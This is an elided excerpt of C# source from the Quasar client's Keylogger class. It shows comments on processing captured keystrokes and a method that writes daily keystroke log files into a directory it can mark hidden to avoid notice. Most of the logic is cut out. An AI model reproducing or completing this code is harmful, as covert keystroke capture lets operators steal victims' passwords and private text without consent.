...
namespace Quasar.Client.Logging
{
    ...
    public class Keylogger : IDisposable
    {
        ...
        /// <summary>
        /// Initial handling of the key down events and updates the window title. This event handler is called first.
        /// </summary>
        ...
        /// <summary>
        /// Processes pressed keys and appends them to the <see cref="_logFileBuffer"/>. <br/>
        /// Processing of Unicode characters starts here. <br/>
        ...
        /// <summary>
        /// Finishes processing of the keys. This event handler is called third.
        /// </summary>
        /// <param name="sender">The sender of  the event.</param>
        ...
        private void WriteFile()
        {
            ...
            string filePath = Path.Combine(Settings.LOGSPATH, DateTime.UtcNow.ToString("yyyy-MM-dd") + "-log");
            ...
            try
            {
                ...
                if (!di.Exists) {
                    Logger.Debug("Creating keylogger logfile directory " + Settings.LOGSPATH);
                    di.Create();
                    Logger.Debug("Created keylogger logfile directory " + Settings.LOGSPATH);
                }

                if (Settings.HIDELOGDIRECTORY) {
                    di.Attributes = FileAttributes.Directory | FileAttributes.Hidden;
                    Logger.Debug("Set keylogger logfile directory to hidden");
                }
                ...
                if (!File.Exists(filePath)) {
                    writeHeader = true;
                    Logger.Debug("Creating new keylogger log file at " + filePath);
                }
            ...
            {
                Logger.Error(String.Format("Exception when writing to keylogger log file: {0}", ex.ToString()));
            }
